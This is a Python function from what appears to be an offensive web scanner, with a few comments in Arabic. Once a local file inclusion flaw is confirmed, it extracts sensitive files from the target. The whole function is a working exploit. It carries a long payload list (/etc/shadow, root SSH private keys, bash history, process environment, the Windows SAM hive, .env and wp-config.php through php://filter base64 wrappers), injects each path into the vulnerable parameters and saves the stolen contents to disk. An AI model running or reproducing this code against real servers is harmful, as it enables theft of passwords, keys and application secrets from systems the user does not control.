def extract_lfi_files(url, vulnerable_params, session, verbose=False):
    """
    Extract sensitive files when LFI vulnerability is confirmed
    Saves each file separately in lfi_extracted/ directory
    """
    cprint(f"\n[LFI Extractor] Extracting sensitive files...", "cyan")
    
    # Common sensitive files to extract (موسعة)
    sensitive_files = [
        # Linux files
        '/etc/passwd', '/etc/shadow', '/etc/group', '/etc/hostname',
        '/etc/hosts', '/etc/issue', '/etc/os-release', '/etc/debian_version',
        '/etc/redhat-release', '/proc/self/environ', '/proc/self/cmdline',
        '/proc/self/status', '/var/log/apache2/access.log',
        '/var/log/apache2/error.log', '/var/log/nginx/access.log',
        '/var/log/nginx/error.log', '/var/log/auth.log', '/var/log/syslog',
        '/root/.bash_history', '/home/*/.bash_history', '/root/.ssh/id_rsa',
        '/root/.ssh/authorized_keys', '/etc/ssh/sshd_config',
        '/etc/mysql/my.cnf', '/etc/nginx/nginx.conf', '/etc/apache2/apache2.conf',
        '/etc/php.ini', '/etc/php/php.ini',
        
        # PHP filters for source code extraction
        'php://filter/convert.base64-encode/resource=config.php',
        'php://filter/convert.base64-encode/resource=.env',
        'php://filter/convert.base64-encode/resource=db.php',
        'php://filter/convert.base64-encode/resource=wp-config.php',
        'php://filter/convert.base64-encode/resource=../config.php',
        'php://filter/convert.base64-encode/resource=../.env',
        'php://filter/convert.base64-encode/resource=../db.php',
        'php://filter/convert.base64-encode/resource=../../config.php',
        'php://filter/convert.base64-encode/resource=../../.env',
        
        # Windows files
        'C:\\Windows\\win.ini', 'C:\\Windows\\system.ini',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        'C:\\Windows\\System32\\config\\sam',
        'C:\\boot.ini', 'C:\\xampp\\apache\\conf\\httpd.conf',
        'C:\\xampp\\php\\php.ini', 'C:\\xampp\\mysql\\bin\\my.ini',
        
        # Application files
        '../.env', '../.git/config', '../config.php', '../db.php',
        '../wp-config.php', '../settings.py', '../.htaccess', '../web.config'
    ]
    
    extracted_files = []
    os.makedirs("lfi_extracted", exist_ok=True)
    
    # Parse URL once for reuse (IMPROVED)
    parsed_url = urlparse(url)
    original_params = parse_qs(parsed_url.query)
    
    for file_path in sensitive_files:
        try:
            # Build URL using proper URL parsing (محسن)
            current_params = original_params.copy()
            for param in vulnerable_params:
                if param in current_params:
                    current_params[param] = [file_path]
                else:
                    current_params[param] = file_path
            
            # Rebuild URL safely
            query_string = urlencode(current_params, doseq=True)
            test_url = parsed_url._replace(query=query_string).geturl()
            
            if verbose:
                cprint(f"[*] Trying to extract: {file_path}", "blue")
            
            response = session.get(test_url, timeout=10, verify=False)
            
            # Check if file was successfully retrieved
            if response.status_code == 200 and len(response.text) > 50:
                # Check if response contains actual file content (not HTML error page)
                if not any(error in response.text.lower() for error in ['<!doctype html', '<html', '404 not found', '403 forbidden']):
                    # Generate safe filename
                    safe_filename = file_path.replace('/', '_').replace('\\', '_').replace('..', '').lstrip('_')
                    save_path = f"lfi_extracted/{safe_filename}.txt"
                    
                    with open(save_path, 'w', encoding='utf-8') as f:
                        f.write(f"Source: {file_path}\n")
                        f.write(f"URL: {test_url}\n")
                        f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                        f.write("="*60 + "\n\n")
                        f.write(response.text)
                    
                    extracted_files.append({
                        'path': file_path,
                        'saved_as': save_path,
                        'size': len(response.text)
                    })
                    
                    cprint(f"    [+] Extracted: {file_path} -> {save_path}", "green")
                    
        except Exception as e:
            if verbose:
                cprint(f"    [!] Failed to extract {file_path}: {e}", "yellow")
    
    # Save summary to lfi_leaks.txt
    if extracted_files:
        summary_file = "lfi_leaks.txt"
        with open(summary_file, 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"Target: {url}\n")
            f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Files extracted: {len(extracted_files)}\n")
            f.write(f"{'='*60}\n")
            for item in extracted_files:
                f.write(f"  - {item['path']} -> {item['saved_as']} ({item['size']} bytes)\n")
        
        cprint(f"\n[+] LFI extraction completed! {len(extracted_files)} files saved to lfi_extracted/", "green")
        cprint(f"[+] Summary saved to: {summary_file}", "green")
    else:
        cprint("[!] No sensitive files could be extracted", "yellow")
    
    return extracted_files


